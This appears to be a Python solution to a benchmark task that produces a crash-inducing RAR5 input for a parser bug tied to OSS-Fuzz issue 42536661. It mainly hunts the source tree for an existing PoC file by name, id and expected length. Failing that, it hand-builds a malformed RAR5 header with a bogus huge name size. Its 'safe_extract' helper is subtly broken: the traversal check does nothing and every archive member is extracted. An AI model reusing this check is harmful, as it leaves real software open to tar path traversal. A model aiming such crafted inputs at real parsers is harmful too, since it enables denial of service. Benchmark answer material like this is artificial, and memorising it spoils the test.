import os
import io
import re
import sys
import binascii
import tarfile
import zipfile
import tempfile
import shutil
from pathlib import Path


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir, tmp = self._prepare_root(src_path)
        try:
            poc = self._find_poc_bytes(root_dir)
            if poc is not None and len(poc) > 0:
                return poc
            # Fallback: attempt to construct a minimal RAR5-like blob.
            return self._fallback_poc()
        finally:
            if tmp is not None:
                shutil.rmtree(tmp, ignore_errors=True)

    # Utilities

    def _prepare_root(self, src_path: str):
        p = Path(src_path)
        if p.is_dir():
            return str(p), None
        # Try tar
        try:
            if tarfile.is_tarfile(src_path):
                tmpdir = tempfile.mkdtemp(prefix="src_extract_")
                with tarfile.open(src_path, mode="r:*") as tf:
                    def is_within_directory(directory, target):
                        abs_directory = os.path.abspath(directory)
                        abs_target = os.path.abspath(target)
                        prefix = os.path.commonprefix([abs_directory, abs_target])
                        return prefix == abs_directory

                    def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                        for member in tar.getmembers():
                            member_path = os.path.join(path, member.name)
                            if not is_within_directory(path, member_path):
                                continue
                        tar.extractall(path, members, numeric_owner=numeric_owner)
                    safe_extract(tf, tmpdir)
                return tmpdir, tmpdir
        except Exception:
            pass
        # Try zip
        try:
            if zipfile.is_zipfile(src_path):
                tmpdir = tempfile.mkdtemp(prefix="src_extract_")
                with zipfile.ZipFile(src_path, mode="r") as zf:
                    zf.extractall(tmpdir)
                return tmpdir, tmpdir
        except Exception:
            pass
        # Fallback: treat as directory if nothing else works
        return str(p), None

    def _find_poc_bytes(self, root_dir: str) -> bytes:
        # Heuristic-based search for PoC files within the extracted source tree
        # We focus on files likely to be RAR5 PoCs or contain embedded PoCs.
        target_len_hint = 1089
        rar_magic = b"Rar!\x1A\x07\x01\x00"

        best = None
        best_score = -1

        # Limit scanning to avoid huge datasets; however, many projects are small enough
        max_file_size = 2 * 1024 * 1024  # 2 MB
        max_text_read = 2 * 1024 * 1024

        # Candidate filename substrings
        name_keywords = [
            "poc", "crash", "repro", "testcase", "min", "id:", "id_", "clusterfuzz", "oss-fuzz",
            "rar", "rar5", "42536661"
        ]
        preferred_exts = {
            ".rar", ".r00", ".r01", ".r02", ".r03", ".r04", ".r05",
            ".bin", ".dat", ".raw", ".txt", ".c", ".h", ".cc", ".cpp", ".po"
        }

        # Pre-scan potential directories to prioritize
        priority_dirs = []
        for dirname in ["poc", "pocs", "crash", "crashes", "tests", "test", "seeds", "corpus", "fuzz", "fuzzing", "fuzzers"]:
            priority_dirs.append(dirname)

        def priority_for_path(path: str) -> int:
            p = path.lower()
            score = 0
            for d in priority_dirs:
                if f"/{d}/" in p or p.endswith("/" + d) or d + "/" in p:
                    score += 10
            for kw in name_keywords:
                if kw in p:
                    score += 5
            return score

        candidates = []

        for dirpath, dirnames, filenames in os.walk(root_dir):
            # Lower priority skip large vendor directories
            base = os.path.basename(dirpath).lower()
            if base in {"build", "out", "node_modules", ".git", ".hg", ".svn"}:
                continue
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                try:
                    st = os.stat(full)
                except Exception:
                    continue
                if not os.path.isfile(full):
                    continue
                if st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                lower = fn.lower()
                ext = os.path.splitext(lower)[1]
                # heuristic filter: file path contains interesting keywords or ext
                pscore = priority_for_path(full)
                if pscore <= 0 and (ext not in preferred_exts) and ("rar" not in lower):
                    # still allow some percentage of random small files
                    if st.st_size <= 4096 and any(k in lower for k in ("poc", "crash", "repro", "id", "rar")):
                        pass
                    else:
                        continue
                # collect
                candidates.append((full, pscore, st.st_size))

        # Prioritize candidates by path priority, then closeness to target length, then smaller size
        candidates.sort(key=lambda x: (-x[1], abs(x[2] - target_len_hint), x[2]))

        # Helper: parse possible C array content
        def parse_c_array_bytes(text: str) -> bytes:
            # Try to find a C array declaration with hex bytes
            # Look for patterns like: { 0x52, 0x61, 0x72, 0x21, ... }
            # We'll parse the largest braces content we find that yields many bytes.
            arr_bytes_best = b""
            # Consider multiple brace blocks
            for m in re.finditer(r'\{([^{}]{1,200000})\}', text, flags=re.DOTALL):
                inner = m.group(1)
                # Replace comments
                inner = re.sub(r'//.*?$', '', inner, flags=re.MULTILINE)
                inner = re.sub(r'/\*.*?\*/', '', inner, flags=re.DOTALL)
                # Split by comma or whitespace
                tokens = re.findall(r'0x[0-9a-fA-F]+|\d+', inner)
                if not tokens:
                    continue
                out = bytearray()
                ok = True
                for tok in tokens:
                    try:
                        if tok.lower().startswith("0x"):
                            v = int(tok, 16)
                        else:
                            v = int(tok, 10)
                        if not (0 <= v <= 255):
                            ok = False
                            break
                        out.append(v & 0xFF)
                    except Exception:
                        ok = False
                        break
                if ok and len(out) > len(arr_bytes_best):
                    arr_bytes_best = bytes(out)
            if len(arr_bytes_best) >= 8:
                return arr_bytes_best
            return b""

        # Evaluate candidates
        for full, pscore, fsize in candidates:
            try:
                with open(full, "rb") as f:
                    # read full content if small; else first up to max_text_read
                    content = f.read()
            except Exception:
                continue

            # If looks like binary and contains RAR5 magic
            is_rar_magic = rar_magic in content
            name = full.lower()
            size = len(content)

            def score(content_bytes: bytes, name_str: str, size_val: int, magic: bool, base_pscore: int) -> int:
                s = 0
                s += base_pscore
                if "42536661" in name_str:
                    s += 200
                if magic:
                    s += 300
                # Prefer names indicating rar or poc
                if "rar" in name_str:
                    s += 50
                if any(k in name_str for k in ("poc", "crash", "repro", "id:", "id_", "min", "testcase", "oss-fuzz", "clusterfuzz")):
                    s += 30
                # Prefer closeness to hint length
                s += max(0, 120 - int(abs(size_val - target_len_hint) / max(1, target_len_hint) * 120))
                # slight preference for smaller sizes
                s += int(1000 / (1 + size_val))
                return s

            s = score(content, name, size, is_rar_magic, pscore)

            best_update = False
            chosen_bytes = content

            # If not RAR magic, try to parse as C array
            if not is_rar_magic and size <= max_text_read:
                try:
                    text = content.decode('utf-8', errors='ignore')
                except Exception:
                    text = ""
                arr = parse_c_array_bytes(text)
                if arr and rar_magic in arr:
                    chosen_bytes = arr
                    s += 150  # big bonus for parsed array having magic
                    # update size variable to arr length for scoring closeness improvement
                    s += max(0, 60 - int(abs(len(arr) - target_len_hint) / max(1, target_len_hint) * 60))

            # If we found exact hint length and magic, return immediately
            if rar_magic in chosen_bytes and len(chosen_bytes) == target_len_hint:
                return chosen_bytes

            if s > best_score:
                best_score = s
                best = chosen_bytes

        # After scanning, return the best candidate if it has rar magic inside
        if best and (rar_magic in best):
            return best

        # As a last attempt, do a linear search for any file containing rar magic, ignoring other heuristics
        for dirpath, _, filenames in os.walk(root_dir):
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                try:
                    st = os.stat(full)
                    if st.st_size <= 0 or st.st_size > max_file_size:
                        continue
                    with open(full, "rb") as f:
                        b = f.read()
                    if rar_magic in b:
                        return b
                except Exception:
                    continue

        return b""

    def _fallback_poc(self) -> bytes:
        # Minimal crafted RAR5-like blob. Not guaranteed to crash, but provides a best-effort structure.
        # RAR5 signature
        magic = b"Rar!\x1A\x07\x01\x00"
        # Append malformed header bytes to try reaching vulnerable code paths
        # Add oversized header field values and random payload to encourage parser to read/allocate.
        # Construct something like: [CRC32][HEAD_SIZE varint][HEAD_TYPE][FLAGS][EXTRA_COUNT][fake data...]
        def vint(n: int) -> bytes:
            # Little-endian base-128 varint, 7 bits per byte with MSB as continuation
            out = bytearray()
            while True:
                b = n & 0x7F
                n >>= 7
                if n:
                    out.append(0x80 | b)
                else:
                    out.append(b)
                    break
            return bytes(out)

        # Fake header
        head_type_file = b"\x02"  # guess for FILE block type
        head_flags = vint(0)
        head_extra_count = vint(0)

        # Try to build a header body with "name size" like varint huge followed by shorter data
        # We'll pretend head_data is large and contains fields including a huge name size to try to provoke allocation
        fake_body = bytearray()
        # Insert some plausible file fields (unpacked size, attributes)
        fake_body += vint(0)     # unpacked size
        fake_body += vint(0)     # attributes
        # Insert a huge name size and then provide a tiny name to mismatch
        huge_name_size = (1 << 28)  # big but not insane
        fake_body += vint(huge_name_size)
        fake_body += b"a" * 5  # small actual name bytes

        # Combine header (without CRC)
        header_wo_crc = bytearray()
        # HEAD_SIZE is length of the rest of header after CRC32. Build it after composing.
        header_body = bytearray()
        header_body += vint(len(head_type_file) + len(head_flags) + len(head_extra_count) + len(fake_body))
        header_body += head_type_file
        header_body += head_flags
        header_body += head_extra_count
        header_body += fake_body

        # Compute CRC32 over header_body (RAR5 uses LE order for CRC field)
        crc = binascii.crc32(header_body) & 0xFFFFFFFF
        header = crc.to_bytes(4, "little") + header_body

        # Append some padding bytes
        payload = magic + header + b"\x00" * 16
        return payload